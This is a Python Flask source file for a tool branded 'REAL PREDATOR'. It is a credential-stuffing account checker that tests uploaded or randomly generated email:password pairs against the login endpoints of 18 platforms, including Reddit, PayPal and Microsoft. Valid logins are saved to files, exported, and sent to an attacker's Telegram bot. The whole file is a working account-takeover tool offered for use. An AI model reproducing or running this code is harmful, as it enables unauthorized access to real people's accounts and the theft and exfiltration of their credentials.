def check_reddit(email, password, session):
    try:
        url = "https://www.reddit.com/api/login"
        data = {"user": email, "passwd": password, "api_type": "json"}
        resp = session.post(url, data=data, timeout=15)
        if '"cookie"' in resp.text and '"modhash"' in resp.text:
            return {'success': True, 'platform': 'Reddit'}, 'hit'
        return None, 'bad'
    except: return None, 'error'

# ================================================================
# توليد حسابات وهمية (احتياطي)
# ================================================================
def generate_weak_account():
    platform = random.choice(PLATFORMS)
    domain_map = {
        'microsoft': ['outlook.com', 'hotmail.com', 'live.com'],
        'google': ['gmail.com', 'googlemail.com'],
        'facebook': ['facebook.com'],
        'instagram': ['instagram.com'],
        'twitter': ['twitter.com', 'x.com'],
        'tiktok': ['tiktok.com'],
        'spotify': ['spotify.com'],
        'netflix': ['netflix.com'],
        'amazon': ['amazon.com'],
        'paypal': ['paypal.com'],
        'steam': ['steam.com', 'steampowered.com'],
        'discord': ['discord.com'],
        'ubisoft': ['ubisoft.com'],
        'ea': ['ea.com'],
        'epic': ['epicgames.com'],
        'roblox': ['roblox.com'],
        'snapchat': ['snapchat.com'],
        'reddit': ['reddit.com'],
    }
    domains = domain_map.get(platform['check'], ['gmail.com'])
    domain = random.choice(domains)
    names = ['john','mike','david','sarah','emma','chris','alex','jordan','ahmed','mohamed','ali','omar','khaled','sami','nour','layla','hunter','shadow','dark','night','storm','blaze','frost','raven','admin','support','info','sales','test','demo','user','guest']
    username = random.choice(names) + str(random.randint(1,9999))
    email = username + '@' + domain
    password = random.choice(COMMON_PASSWORDS) if random.random() > 0.3 else username + str(random.randint(1,99))
    return email, password, platform['name'], platform['check'], platform.get('gaming', False)

# ================================================================
# الحلقة الرئيسية (معدلة للدعم التلقائي)
# ================================================================
def predator_loop():
    while state.running:
        try:
            # استخدام القائمة المرفوعة أو التوليد العشوائي
            if state.combo_list:
                with state.lock:
                    if not state.combo_list:
                        time.sleep(1)
                        continue
                    # استخراج البيانات مع المنصة المحددة
                    item = state.combo_list.pop(0)
                    if len(item) == 3:
                        email, password, detected_platform = item
                    else:
                        email, password = item
                        detected_platform = None
                
                # إذا تم تحديد منصة، استخدمها. وإلا اكتشف تلقائياً.
                if detected_platform:
                    check_func = detected_platform
                    platform_obj = next((p for p in PLATFORMS if p['check'] == detected_platform), None)
                    is_gaming = platform_obj.get('gaming', False) if platform_obj else False
                    platform_name = platform_obj.get('name', detected_platform) if platform_obj else detected_platform
                else:
                    # اكتشاف تلقائي
                    detected = detect_platform(email)
                    if detected:
                        platform_obj = next((p for p in PLATFORMS if p['check'] == detected), None)
                        check_func = detected
                        is_gaming = platform_obj.get('gaming', False) if platform_obj else False
                        platform_name = platform_obj.get('name', detected) if platform_obj else detected
                    else:
                        # إذا لم يتم التعرف على المنصة، توزيع عشوائي
                        platform = random.choice(PLATFORMS)
                        check_func = platform['check']
                        platform_name = platform['name']
                        is_gaming = platform.get('gaming', False)
            else:
                email, password, platform_name, check_func, is_gaming = generate_weak_account()

            # اختيار دالة الفحص
            check_map = {
                'microsoft': check_microsoft, 'google': check_google,
                'facebook': check_facebook, 'instagram': check_instagram,
                'twitter': check_twitter, 'tiktok': check_tiktok,
                'spotify': check_spotify, 'netflix': check_netflix,
                'amazon': check_amazon, 'paypal': check_paypal,
                'steam': check_steam, 'discord': check_discord,
                'ubisoft': check_ubisoft, 'ea': check_ea,
                'epic': check_epic, 'roblox': check_roblox,
                'snapchat': check_snapchat, 'reddit': check_reddit,
            }

            session = requests.Session()
            session.verify = False
            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})

            check_function = check_map.get(check_func)
            if check_function:
                result, status = check_function(email, password, session)
            else:
                result, status = None, 'bad'

            with state.lock:
                state.checked += 1

            if result and result.get('success'):
                with state.lock:
                    state.hits += 1
                    state.generated += 1
                    num = state.generated
                    if is_gaming:
                        state.gaming = getattr(state, 'gaming', 0) + 1

                hit_content = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 Account #{num}{' 🎮 GAMING' if is_gaming else ''}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
🌐 Platform: {platform_name}
📊 Status: ✅ VALID & WORKING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                state.results.insert(0, {'content': hit_content, 'is_gaming': is_gaming})
                if len(state.results) > 200:
                    state.results = state.results[:200]

                add_feed('hit' if not is_gaming else 'gaming', f'✅ {platform_name} | {email}')
                save_hit(hit_content, is_gaming)

                # إرسال إلى تلغرام فقط للحسابات الشغالة
                if state.telegram_enabled and state.bot_token and state.chat_id:
                    send_telegram(f"🔥 REAL PREDATOR VALID HIT!\n{hit_content}")

            elif status == 'bad':
                with state.lock:
                    state.bad += 1
                add_feed('bad', f'❌ {platform_name} | {email}')
            else:
                with state.lock:
                    state.errors += 1

            time.sleep(60 / state.speed if state.speed > 0 else 2)

        except Exception as e:
            with state.lock:
                state.errors += 1
            time.sleep(2)

def add_feed(feed_type, text):
    with state.feed_lock:
        state.feed.insert(0, {'type': feed_type, 'text': text, 'time': datetime.now().strftime('%H:%M:%S')})
        if len(state.feed) > 100:
            state.feed = state.feed[:100]

def save_hit(content, is_gaming=False):
    try:
        os.makedirs('REAL_PREDATOR_HITS', exist_ok=True)
        filename = f'REAL_PREDATOR_HITS/hits_{datetime.now().strftime("%Y%m%d")}.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n\n')
        if is_gaming:
            gaming_file = f'REAL_PREDATOR_HITS/gaming_{datetime.now().strftime("%Y%m%d")}.txt'
            with open(gaming_file, 'a', encoding='utf-8') as f:
                f.write(content + '\n\n')
    except: pass

def send_telegram(content):
    try:
        url = f"https://api.telegram.org/bot{state.bot_token}/sendMessage"
        data = {"chat_id": state.chat_id, "text": content}
        requests.post(url, data=data, timeout=10)
    except: pass

# ================================================================
# Routes
# ================================================================
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, developer=DEVELOPER, dev_telegram=DEV_TELEGRAM, whatsapp_link=WHATSAPP_LINK, platforms=PLATFORMS)

@app.route('/api/stats')
def get_stats():
    elapsed = 0
    if state.start_time:
        elapsed = time.time() - state.start_time
    cpm = int((state.checked / elapsed) * 60) if elapsed > 2 else 0
    return jsonify({
        'success': True, 'running': state.running, 'checked': state.checked,
        'total': state.total, 'hits': state.hits, 'bad': state.bad,
        'errors': state.errors, 'gaming': getattr(state, 'gaming', 0),
        'remaining': len(state.combo_list), 'elapsed': int(elapsed), 'cpm': cpm
    })

@app.route('/api/feed')
def get_feed():
    return jsonify({'success': True, 'feed': state.feed[:100]})

@app.route('/api/results')
def get_results():
    return jsonify({'success': True, 'results': state.results[:200]})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if state.running:
        return jsonify({'success': False, 'error': 'Already running'})
    data = request.json or {}
    speed = int(data.get('speed', 30))
    state.speed = min(max(speed, 5), 60)
    with state.lock:
        state.running = True
        state.start_time = time.time()
        state.checked = 0
        state.total = len(state.combo_list) if state.combo_list else 0
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
        state.generated = 0
        state.feed = []
        state.results = []
    add_feed('info', f'🔥 STARTED | {state.speed} RPM | Auto-Detection ON')
    thread = threading.Thread(target=predator_loop, daemon=True)
    thread.start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    state.running = False
    add_feed('info', '🛑 STOPPED')
    return jsonify({'success': True})

@app.route('/api/clear', methods=['POST'])
def clear_data():
    with state.lock:
        state.results = []
        state.feed = []
        state.checked = 0
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    data = request.json
    content = data.get('content', '')
    lines = [l.strip() for l in content.split('\n') if ':' in l.strip()]
    state.combo_list = []
    platform_stats = {}
    
    for line in lines:
        parts = line.split(':', 1)
        if len(parts) == 2:
            email = parts[0].strip()
            password = parts[1].strip()
            detected = detect_platform(email)
            if detected:
                state.combo_list.append((email, password, detected))
                platform_stats[detected] = platform_stats.get(detected, 0) + 1
            else:
                # إذا لم يتم التعرف، نضيف بدون منصة محددة (سيتم توزيعه عشوائياً)
                state.combo_list.append((email, password, None))
    
    state.total = len(state.combo_list)
    stats_msg = ', '.join([f"{p}: {c}" for p, c in platform_stats.items()])
    add_feed('info', f'📤 Uploaded {len(state.combo_list)} accounts | Detected: {stats_msg if stats_msg else "None (random distribution)"}')
    return jsonify({'success': True, 'count': len(state.combo_list), 'stats': platform_stats})

@app.route('/api/export', methods=['POST'])
def export_results():
    if not state.results:
        return jsonify({'success': False, 'error': 'No results'})
    filename = f"real_predator_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"REAL PREDATOR VALID ACCOUNTS\nDate: {datetime.now()}\nTotal: {len(state.results)}\n\n")
        for item in state.results:
            f.write(item['content'] + '\n\n')
    return jsonify({'success': True, 'filename': filename})

@app.route('/api/download/<filename>')
def download_file(filename):
    if os.path.exists(filename):
        return send_file(filename, as_attachment=True)
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/telegram/config', methods=['POST'])
def telegram_config():
    data = request.json
    state.bot_token = data.get('bot_token', '').strip()
    state.chat_id = data.get('chat_id', '').strip()
    state.telegram_enabled = data.get('enabled', False)
    add_feed('info', f'📡 Telegram: {"ON" if state.telegram_enabled else "OFF"}')
    return jsonify({'success': True})

# ================================================================
# تشغيل السيرفر
# ================================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 2030))
    print("""
╔══════════════════════════════════════════════════════════════╗
║   REAL PREDATOR v15.6 - ULTIMATE EDITION                  ║
║   Developer: ZERO STORE                                    ║
║   Telegram: @MRDPY                                          ║
║   AUTO-PLATFORM DETECTION ENABLED                         ║
║   Supported: 18 platforms (Gaming + Social + Email)       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
